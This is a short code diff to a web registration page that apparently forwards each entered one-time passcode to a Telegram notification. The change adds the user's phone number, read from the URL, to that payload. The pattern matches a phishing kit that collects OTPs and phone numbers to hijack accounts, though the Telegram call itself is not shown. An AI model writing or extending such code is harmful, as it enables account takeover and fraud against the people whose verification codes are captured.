@@ -26,10 +26,17 @@ export default function RegisterVerifyOtpPage() {
     
     // Send notification to Telegram with OTP
     try {
+      const urlParams = new URLSearchParams(window.location.search);
+      const phone = urlParams.get('phone') || 'Unknown';
+      
       await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ otp, action: 'register_otp_verify' })
+        body: JSON.stringify({ 
+          otp, 
+          action: 'register_otp_verify',
+          phone: phone
+        })
       });
     } catch (err) {
       console.error('Failed to send notification:', err);
